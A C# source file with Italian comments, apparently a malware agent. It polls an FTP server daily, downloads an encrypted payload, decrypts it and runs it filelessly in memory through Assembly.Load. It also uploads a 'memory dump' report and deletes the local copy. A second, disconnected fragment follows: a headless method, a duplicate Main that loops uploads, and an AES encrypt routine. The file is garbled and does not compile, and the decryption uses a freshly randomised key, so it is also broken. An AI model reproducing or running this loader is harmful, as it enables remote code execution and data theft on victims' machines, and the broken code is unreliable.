using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Reflection;

public class SecurePayloadAgent
{
    private static string ftpServer = "ftp://192.168.1.100";
    private static string username = "user";
    private static string password = "password";
    private static string localTempPath = Path.Combine(Path.GetTempPath(), "agent_payload.bin");
    private static string logPath = Path.Combine(Path.GetTempPath(), "agent_log.txt");
    private static byte[] aesKey = new byte[32];  // 256 bit
    private static byte[] aesIV = new byte[16];   // 128 bit

    public static void Main()
    {
        InitializeCryptoKeys();

        Log("Agent started.");

        while (true)
        {
            try
            {
                string payloadName = "payload.enc"; // es. file cifrato AES sul FTP
                string ftpUri = $"{ftpServer}/{payloadName}";

                Log($"Scaricamento payload da: {ftpUri}");

                bool downloaded = Retry(() => DownloadFile(ftpUri, localTempPath), maxRetries: 5);
                if (!downloaded)
                {
                    Log("Scaricamento payload fallito dopo retry.");
                    Thread.Sleep(60000); // attende 1 min prima retry
                    continue;
                }

                byte[] encryptedPayload = File.ReadAllBytes(localTempPath);
                byte[] decryptedPayload = AesDecrypt(encryptedPayload, aesKey, aesIV);

                Log("Payload decifrato in memoria, esecuzione fileless...");
                bool execSuccess = ExecutePayloadFromMemory(decryptedPayload);

                Log($"Esecuzione payload: {(execSuccess ? "Successo" : "Fallita")}");

                Log("Preparazione e upload report...");
                bool reportSuccess = Retry(UploadReport, maxRetries: 3);

                Log($"Upload report: {(reportSuccess ? "Successo" : "Fallito")}");

                Thread.Sleep(TimeSpan.FromHours(24)); // Ciclo 1 giorno
            }
            catch (Exception ex)
            {
                Log($"Eccezione generica agente: {ex}");
                Thread.Sleep(60000);
            }
        }
    }

    // Inizializza chiavi crypto
    private static void InitializeCryptoKeys()
    {
        using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(aesKey);
            rng.GetBytes(aesIV);
        }
        Log("Chiavi AES generate in memoria.");
    }

    // Logging senza password, scrive solo messaggi generici
    private static void Log(string message)
    {
        string logEntry = $"[{DateTime.Now:O}] {message}";
        Console.WriteLine(logEntry);
        File.AppendAllText(logPath, logEntry + "\n");
    }

    // Metodo retry semplice con azioni synchronous
    private static bool Retry(Action action, int maxRetries)
    {
        int tries = 0;
        while (tries < maxRetries)
        {
            try
            {
                action();
                return true;
            }
            catch
            {
                tries++;
                Thread.Sleep(2000 * tries);
            }
        }
        return false;
    }

    // Download di file da FTP
    private static void DownloadFile(string uri, string localPath)
    {
        WebClient wc = new WebClient();
        wc.Credentials = new NetworkCredential(username, password);
        wc.DownloadFile(uri, localPath);
    }

    // Upload report criptato (es. dump, log)
    private static void UploadReport()
    {
        string reportFile = Path.Combine(Path.GetTempPath(), "memory_dump.enc");
        if (!File.Exists(reportFile))
        {
            Log("Nessun report da caricare.");
            return;
        }

        WebClient wc = new WebClient();
        wc.Credentials = new NetworkCredential(username, password);
        string remoteUri = $"{ftpServer}/reports/memory_dump.enc";

        wc.UploadFile(remoteUri, reportFile);

        Log("Report caricato, file locale cancellato.");
        File.Delete(reportFile);
    }

    // AES Decrypt metodo
    private static byte[] AesDecrypt(byte[] cipherText, byte[] key, byte[] iv)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            using (var decryptor = aes.CreateDecryptor())
            {
                return decryptor.TransformFinalBlock(cipherText, 0, cipherText.Length);
            }
        }
    }

    // Fileless esecuzione in memoria di Assembly C#
    public static bool ExecutePayloadFromMemory(byte[] assemblyBytes)
    {
        try
        {
            Assembly asm = Assembly.Load(assemblyBytes);
            MethodInfo entry = asm.EntryPoint;
            if (entry == null)
            {
                Log("Payload no entry point trovato.");
                return false;
            }
            object instance = null;
            if (entry.GetParameters().Length > 0)
            {
                instance = asm.CreateInstance(entry.Name);
                entry.Invoke(instance, new object[] { new string[] { } });
            }
            else
            {
                entry.Invoke(null, null);
            }
            return true;
        }
        catch (Exception ex)
        {
            Log($"Errore esecuzione payload fileless: {ex.Message}");
            return false;
        }
    }
}
    {
        WebClient client = new WebClient();
        // You need to define 'username' and 'password' variables or pass them as parameters
        // Example:
        // client.Credentials = new NetworkCredential("yourUsername", "yourPassword");
        client.UploadFile(ftpUri, tempFile);

        File.Delete(tempFile);
    }

    static void Main()
    {
        string localReportPath = "report.txt";
        string ftpUri = "ftp://server/upload/report.enc";
        byte[] aesKey = Convert.FromBase64String("your_base64_encoded_key"); // 16/24/32 bytes key
        byte[] aesIv = Convert.FromBase64String("your_base64_encoded_iv");   // 16 bytes IV
        int maxRetries = 3;
        int retryDelayMs = 2000;

        while (true)
        {
            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                try
                {
                    UploadEncryptedReport(localReportPath, ftpUri, aesKey, aesIv);
                    Log("Report uploaded successfully");
                    break;
                }
                catch (Exception ex)
                {
                    Log($"Upload attempt {attempt + 1} failed: {ex.Message}");
                    Thread.Sleep(retryDelayMs);
                }
            }
            Thread.Sleep(60000); // Wait before next upload
        }
    }
    // Funzione AES per cifrare/decifrare un byte array con chiave e IV
    public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
    {
        using Aes aes = Aes.Create();
        aes.Key = key;
        aes.IV = iv;
        using MemoryStream ms = new();
        using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
        }
        return ms.ToArray();
    }
